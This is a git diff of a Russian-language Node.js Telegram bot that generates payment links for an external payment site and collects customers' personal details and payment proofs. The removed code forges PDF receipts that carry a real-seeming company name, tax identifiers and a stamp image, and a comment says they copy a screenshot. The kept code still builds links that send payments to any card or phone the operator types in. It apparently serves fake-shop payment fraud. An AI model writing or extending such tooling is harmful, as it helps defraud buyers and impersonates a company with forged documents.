@@ -3,21 +3,16 @@ require("dotenv").config();
 const express = require("express");
 const multer = require("multer");
 const cors = require("cors");
-const { Telegraf, Markup } = require("telegraf");
 const PDFDocument = require("pdfkit");
 const fs = require("fs");
 const path = require("path");
+const { Telegraf, Markup } = require("telegraf");
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const TG_CHAT_ID = process.env.TG_CHAT_ID;
 const BASE_PAYMENT_URL = process.env.BASE_PAYMENT_URL || "https://warepointpay.ru";
 const APP_BASE_URL = process.env.APP_BASE_URL || "https://warepoint-pay-bot.onrender.com";
 const PORT = Number(process.env.PORT || 3000);
-
-if (!BOT_TOKEN) {
-  console.error("❌ Нет BOT_TOKEN!");
-  process.exit(1);
-}
 
 const bot = new Telegraf(BOT_TOKEN);
 const app = express();
@@ -30,486 +25,128 @@ const upload = multer({ storage: multer.memoryStorage() });
 
 const sessions = new Map();
 const orders = new Map();
-const lastOrders = new Map();
 
-const RECEIPTS_DIR = path.join(__dirname, "receipts");
-if (!fs.existsSync(RECEIPTS_DIR)) {
-  fs.mkdirSync(RECEIPTS_DIR, { recursive: true });
+function normalizeCard(value) {
+  return String(value || "").replace(/\D/g, "");
 }
 
-const FONT_REGULAR = path.join(__dirname, "DejaVuSans.ttf");
-const FONT_BOLD = path.join(__dirname, "DejaVuSans-Bold.ttf");
-const STAMP_PATH = path.join(__dirname, "stamp.png");
+function normalizeAmount(value) {
+  return String(value || "").replace(/[^\d]/g, "");
+}
 
-// ============ ФУНКЦИИ ============
-function normalizeDigits(value) {
-  return String(value || "").replace(/\D/g, "");
+function getDateTime() {
+  const now = new Date();
+  return new Date(
+    now.toLocaleString("en-US", { timeZone: "Europe/Moscow" })
+  ).toLocaleString("ru-RU");
 }
 
 function formatAmount(val) {
   return Number(val || 0).toLocaleString("ru-RU") + " ₽";
 }
 
-function formatAmountPdf(value) {
-  const num = String(value || "").replace(/[^\d]/g, "");
-  if (!num) return "0,00 ₽";
-  return Number(num).toLocaleString("ru-RU") + ",00 ₽";
-}
-
-function getDateTime() {
-  return new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
-}
-
-// ============ PDF ТОЧНО КАК НА СКРИНЕ ============
-function generateConfirmationPdfBuffer(meta) {
-  return new Promise((resolve, reject) => {
-    try {
-      const doc = new PDFDocument({ size: "A4", margin: 28 });
-      const chunks = [];
-      
-      doc.on("data", (chunk) => chunks.push(chunk));
-      doc.on("end", () => resolve(Buffer.concat(chunks)));
-      doc.on("error", reject);
-
-      doc.registerFont("regular", FONT_REGULAR);
-      doc.registerFont("bold", FONT_BOLD);
-
-      const pageWidth = doc.page.width;
-      const left = 36;
-      const right = pageWidth - 36;
-      const contentWidth = right - left;
-
-      const order = String(meta.order || "—");
-      const product = String(meta.product || "Товар");
-      const amount = formatAmountPdf(meta.amount || "0");
-      const date = getDateTime();
-
-      function hr(y) {
-        doc.moveTo(left, y).lineTo(right, y).stroke("#000");
-      }
-
-      function stars(y) {
-        doc.font("regular").fontSize(8);
-        const starLine = "*".repeat(70);
-        doc.text(starLine, left, y, { align: "center" });
-      }
-
-      let y = 35;
-
-      // Шапка №1
-      doc.font("bold").fontSize(13);
-      doc.text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, { align: "center" });
-      
-      y += 30;
-      doc.font("regular").fontSize(9);
-      doc.text('Сокращенное наименование: ООО "БЕТОН"', left, y, { align: "center" });
-      y += 16;
-      doc.text("ИНН: 9726099596", left, y, { align: "center" });
-      y += 16;
-      doc.text("ОГРН: 1257700249157", left, y, { align: "center" });
-      y += 16;
-      doc.text("КПП: 772601001", left, y, { align: "center" });
-
-      y += 25;
-      hr(y);
-      
-      y += 15;
-      doc.font("bold").fontSize(11);
-      doc.text('Чек- ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, { align: "center" });
-
-      y += 20;
-      doc.font("regular").fontSize(9);
-      doc.text(date, left, y, { align: "center" });
-
-      y += 20;
-      doc.font("regular").fontSize(9);
-      doc.text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, { align: "center" });
-      y += 15;
-      doc.text('Сокращенное наименование: ООО "БЕТОН"', left, y, { align: "center" });
-      y += 15;
-      doc.text("ИНН 9726099596", left, y, { align: "center" });
-      y += 15;
-      doc.text("КПП 772601001", left, y, { align: "center" });
-
-      y += 30;
-      stars(y);
-
-      // Товар
-      y += 30;
-      doc.font("bold").fontSize(12);
-      doc.text(`${product}    1шт`, left, y, { align: "center" });
-
-      y += 30;
-      doc.font("bold").fontSize(18);
-      doc.text(amount, left, y, { align: "center" });
-
-      y += 30;
-      stars(y);
-
-      // Доставка
-      y += 30;
-      doc.font("regular").fontSize(12);
-      doc.text("Доставка    0.00", left, y, { align: "center" });
-      y += 20;
-      doc.text("Бесплатно", left, y, { align: "center" });
-
-      y += 30;
-      stars(y);
-
-      // Оплата
-      y += 30;
-      doc.font("regular").fontSize(12);
-      doc.text(`Безналичный    ${amount}`, left, y, { align: "center" });
-      y += 20;
-      doc.text("Платёж через СБП", left, y, { align: "center" });
-
-      y += 25;
-      doc.font("bold").fontSize(14);
-      doc.text(`Сума    ${amount}`, left, y, { align: "center" });
-
-      y += 30;
-      doc.font("regular").fontSize(12);
-      doc.text("С НДС НЕТ    0%", left, y, { align: "center" });
-      y += 20;
-      doc.text(`Заказ №${order}`, left, y, { align: "center" });
-
-      y += 35;
-
-      // Печать
-      if (fs.existsSync(STAMP_PATH)) {
-        try {
-          const size = 130;
-          const x = pageWidth / 2 - size / 2;
-
-          doc.save();
-          doc.opacity(0.85);
-          doc.rotate(-10, {
-            origin: [x + size / 2, y + size / 2]
-          });
-          doc.image(STAMP_PATH, x, y, {
-            fit: [size, size]
-          });
-          doc.restore();
-        } catch (e) {
-          console.error("STAMP ERROR:", e);
-        }
-      }
-
-      doc.end();
-    } catch (err) {
-      reject(err);
-    }
-  });
-}
-
-// ============ МЕНЮ ============
-async function setupMenu() {
-  try {
-    await bot.telegram.setMyCommands([
-      { command: "new", description: "💳 Новый платеж" },
-      { command: "links", description: "📋 Мои ссылки" },
-      { command: "repeat", description: "🔄 Повторить" },
-      { command: "cancel", description: "❌ Отмена" }
-    ]);
-  } catch (e) {
-    console.error("Ошибка меню:", e.message);
-  }
-}
-
-const MAIN_MENU = [
-  ["💳 Новый платеж"],
-  ["📋 Мои ссылки"],
-  ["🔄 Повторить"],
-  ["❌ Отмена"]
-];
-
-function showMainMenu(ctx) {
-  return ctx.reply("👇 Выберите действие:", Markup.keyboard(MAIN_MENU).resize());
-}
-
 function buildPaymentUrl(data) {
-  const params = new URLSearchParams();
-  
-  params.set("order", data.order || "");
-  params.set("product", data.product || "");
-  params.set("amount", data.amount || "");
-  params.set("bank", data.bank || "");
-  params.set("recipient", data.recipient || "");
-  params.set("requisite", data.requisite || "");
+  const id = Math.random().toString(36).substring(2, 8);
 
-  const expires = Date.now() + 15 * 60 * 1000;
-  params.set("expires", String(expires));
-
-  const url = `${BASE_PAYMENT_URL}?${params.toString()}`;
-  
-  console.log("🔗 URL:", url);
-  console.log("📱 requisite:", data.requisite);
-  
-  const orderId = data.order || Math.random().toString(36).substring(2, 8);
-  orders.set(orderId, { ...data, id: orderId, status: "pending", createdAt: Date.now() });
-
-  return url;
-}
-
-// ============ БОТ ============
-bot.catch((err, ctx) => {
-  console.error("Ошибка бота:", err.message);
-});
-
-bot.start(async (ctx) => {
-  await ctx.reply("🚀 Бот для создания платёжных ссылок");
-  await showMainMenu(ctx);
-});
-
-bot.command("new", async (ctx) => {
-  sessions.set(ctx.from.id, { step: "order", data: {} });
-  await ctx.reply("📦 Введите номер заказа:");
-});
-
-bot.hears("💳 Новый платеж", async (ctx) => {
-  sessions.set(ctx.from.id, { step: "order", data: {} });
-  await ctx.reply("📦 Введите номер заказа:");
-});
-
-bot.hears("📋 Мои ссылки", async (ctx) => {
-  let msg = "📋 Последние заказы:\n\n";
-  let count = 0;
-  
-  orders.forEach((order) => {
-    if (count >= 5) return;
-    const statusEmoji = order.status === "approved" ? "✅" : order.status === "rejected" ? "❌" : "⏳";
-    msg += `${statusEmoji} Заказ: ${order.order} | ${formatAmount(order.amount)}\n`;
-    count++;
+  orders.set(id, {
+    ...data,
+    id,
+    status: "pending",
+    createdAt: Date.now()
   });
 
-  if (count === 0) msg = "Нет созданных заказов.";
-  await ctx.reply(msg);
+  return `${BASE_PAYMENT_URL}?id=${id}`;
+}
+
+bot.start((ctx) => {
+  ctx.reply("Бот работает 🚀");
 });
 
-bot.hears("🔄 Повторить", async (ctx) => {
-  const last = lastOrders.get(ctx.from.id);
-  if (!last) return ctx.reply("Нет последнего заказа.");
-  
-  const url = buildPaymentUrl({ ...last, userId: ctx.from.id });
-  await ctx.reply(`🔄 Повтор:\n📦 ${last.order}\n💰 ${formatAmount(last.amount)}\n🔗 ${url}`);
+bot.command("new", (ctx) => {
+  sessions.set(ctx.from.id, { step: 0, data: {} });
+  ctx.reply("Введите номер заказа");
 });
 
-bot.hears("❌ Отмена", async (ctx) => {
-  sessions.delete(ctx.from.id);
-  await ctx.reply("❌ Отменено.");
-});
-
-// 👇 УБРАЛИ ВЫБОР КАРТА/ТЕЛЕФОН — сразу просим реквизит
 bot.on("text", async (ctx) => {
   const session = sessions.get(ctx.from.id);
   if (!session) return;
 
   const text = ctx.message.text;
 
-  try {
-    switch (session.step) {
-      case "order":
-        session.data.order = text;
-        session.step = "product";
-        await ctx.reply("🛍 Товар:");
-        break;
+  const steps = ["order", "product", "amount", "card", "bank", "recipient"];
 
-      case "product":
-        session.data.product = text;
-        session.step = "amount";
-        await ctx.reply("💰 Сумма (только цифры):");
-        break;
+  const key = steps[session.step];
+  let value = text;
 
-      case "amount":
-        const amt = normalizeDigits(text);
-        if (!amt) return ctx.reply("❌ Только цифры!");
-        session.data.amount = amt;
-        session.step = "requisite";
-        // 👇 Сразу просим реквизит, без выбора
-        await ctx.reply("📝 Реквизит для перевода (номер карты, телефона или что угодно):");
-        break;
+  if (key === "amount") {
+    value = normalizeAmount(value);
+  }
 
-      case "requisite":
-        // 👇 Принимаем ЛЮБОЙ текст, без ограничений
-        session.data.requisite = text;
-        session.step = "bank";
-        await ctx.reply("🏦 Банк:");
-        break;
+  if (key === "card") {
+    const digits = normalizeCard(value);
 
-      case "bank":
-        session.data.bank = text;
-        session.step = "recipient";
-        await ctx.reply("👤 Получатель:");
-        break;
-
-      case "recipient":
-        session.data.recipient = text;
-        session.data.userId = ctx.from.id;
-        
-        const url = buildPaymentUrl(session.data);
-        lastOrders.set(ctx.from.id, { ...session.data });
-        
-        await ctx.reply(
-          `✅ Готово!\n\n` +
-          `📦 Заказ: ${session.data.order}\n` +
-          `🛍 Товар: ${session.data.product}\n` +
-          `💰 Сумма: ${formatAmount(session.data.amount)}\n` +
-          `📝 Реквизит: ${session.data.requisite}\n` +
-          `🏦 Банк: ${session.data.bank}\n` +
-          `👤 Получатель: ${session.data.recipient}\n\n` +
-          `🔗 ${url}`
-        );
-        
-        sessions.delete(ctx.from.id);
-        await showMainMenu(ctx);
-        break;
+    if (digits.length < 6) {
+      return ctx.reply("Введите карту или телефон");
     }
-  } catch (err) {
-    console.error("Ошибка:", err);
+
+    value = digits;
+  }
+
+  session.data[key] = value;
+  session.step++;
+
+  if (session.step >= steps.length) {
+    const url = buildPaymentUrl(session.data);
+
+    ctx.reply(`Ссылка создана:\n${url}`);
     sessions.delete(ctx.from.id);
-    ctx.reply("❌ Ошибка. /new — начать заново");
+    return;
   }
+
+  const next = [
+    "Введите номер заказа",
+    "Введите товар",
+    "Введите сумму",
+    "Введите карту или телефон",
+    "Введите банк",
+    "Введите получателя"
+  ];
+
+  ctx.reply(next[session.step]);
 });
 
-// ============ API ============
-app.get("/status", (req, res) => {
-  const order = orders.get(req.query.order);
-  if (!order) return res.json({ ok: false });
-  res.json({ ok: true, status: order.status, data: order });
-});
+app.get("/order", (req, res) => {
+  const id = req.query.id;
+  const order = orders.get(id);
 
-app.get("/receipt", (req, res) => {
-  const orderId = req.query.order;
-  const filePath = path.join(RECEIPTS_DIR, `receipt_${orderId}.pdf`);
-  
-  if (!fs.existsSync(filePath)) {
-    return res.status(404).send("Чек не найден");
+  if (!order) {
+    return res.json({ ok: false });
   }
-  
-  res.sendFile(filePath);
+
+  res.json({ ok: true, data: order });
 });
 
 app.post("/send", upload.single("file"), async (req, res) => {
   try {
-    const orderId = req.body.order;
-    const order = orders.get(orderId);
+    const { id } = req.body;
+    const order = orders.get(id);
 
-    if (!order) {
-      return res.json({ ok: false, error: "Заказ не найден" });
-    }
+    if (!order) return res.json({ ok: false });
 
-    order.customer_name = req.body.customer_name || "";
-    order.customer_phone = req.body.customer_phone || "";
-    order.customer_email = req.body.customer_email || "";
-    order.delivery = req.body.delivery || "";
-    order.city = req.body.city || "";
-    order.full_address = req.body.full_address || "";
-    order.pickup = req.body.pickup || "";
-    order.comment = req.body.comment || "";
-    order.status = "checking";
-
-    let message = `💸 Новое подтверждение оплаты\n\n`;
-    message += `📦 Заказ: ${order.order}\n`;
-    message += `🛍 Товар: ${order.product}\n`;
-    message += `💰 Сумма: ${formatAmount(order.amount)}\n`;
-    message += `📝 Реквизит: ${order.requisite}\n`;
-    message += `🏦 Банк: ${order.bank}\n`;
-    message += `👤 Получатель: ${order.recipient}\n`;
-    
-    if (order.comment) {
-      message += `\n💬 Комментарий: ${order.comment}\n`;
-    }
-    
-    message += `\n📌 Статус: Ожидает проверки`;
-
-    if (TG_CHAT_ID) {
-      await bot.telegram.sendMessage(TG_CHAT_ID, message, {
-        ...Markup.inlineKeyboard([
-          [
-            Markup.button.callback("✅ Подтвердить", `approve_${orderId}`),
-            Markup.button.callback("❌ Отклонить", `reject_${orderId}`)
-          ]
-        ])
-      });
-
-      if (req.file && req.file.buffer && req.file.size > 0) {
-        await bot.telegram.sendDocument(TG_CHAT_ID, {
-          source: req.file.buffer,
-          filename: req.file.originalname
-        });
-      }
-    }
-
-    res.json({ ok: true });
-  } catch (e) {
-    console.error("Ошибка send:", e);
-    res.json({ ok: false, error: e.message });
-  }
-});
-
-// ============ КНОПКИ ============
-bot.action(/approve_(.+)/, async (ctx) => {
-  const orderId = ctx.match[1];
-  const order = orders.get(orderId);
-
-  if (!order) {
-    return ctx.answerCbQuery("Заказ не найден");
-  }
-
-  order.status = "approved";
-
-  try {
-    const pdfBuffer = await generateConfirmationPdfBuffer(order);
-    const pdfPath = path.join(RECEIPTS_DIR, `receipt_${orderId}.pdf`);
-    fs.writeFileSync(pdfPath, pdfBuffer);
-
-    const receiptUrl = `${APP_BASE_URL}/receipt?order=${orderId}`;
-
-    const oldText = ctx.callbackQuery.message.text || "";
-    const newText = oldText.replace("Ожидает проверки", "Оплата подтверждена ✅");
-
-    await ctx.editMessageText(newText);
-
-    await ctx.reply(
-      `✅ Оплата подтверждена!\n\n📦 Заказ: #${orderId}\n🔗 Чек: ${receiptUrl}`
+    await bot.telegram.sendMessage(
+      TG_CHAT_ID,
+      `💸 Новый чек\n\nЗаказ: ${order.order}\nСумма: ${formatAmount(order.amount)}`
     );
 
-    await ctx.replyWithDocument({
-      source: pdfBuffer,
-      filename: `Подтверждение_оплаты_заказ_${orderId}.pdf`
-    });
-
-    return ctx.answerCbQuery("Подтверждено!");
-  } catch (err) {
-    console.error("Ошибка PDF:", err);
-    return ctx.answerCbQuery("Ошибка создания PDF");
+    return res.json({ ok: true });
+  } catch (e) {
+    return res.json({ ok: false });
   }
 });
 
-bot.action(/reject_(.+)/, async (ctx) => {
-  const orderId = ctx.match[1];
-  const order = orders.get(orderId);
-
-  if (!order) {
-    return ctx.answerCbQuery("Заказ не найден");
-  }
-
-  order.status = "rejected";
-
-  const oldText = ctx.callbackQuery.message.text || "";
-  const newText = oldText.replace("Ожидает проверки", "Оплата отклонена ❌");
-
-  await ctx.editMessageText(newText);
-
-  return ctx.answerCbQuery("Отклонено!");
-});
-
-// ============ ЗАПУСК ============
 app.post("/bot", bot.webhookCallback("/bot"));
 
 app.listen(PORT, async () => {
-  await setupMenu();
-  await bot.telegram.deleteWebhook();
   await bot.telegram.setWebhook(`${APP_BASE_URL}/bot`);
-  console.log("✅ Бот и API запущены на порту", PORT);
+  console.log("Запущено");
 });
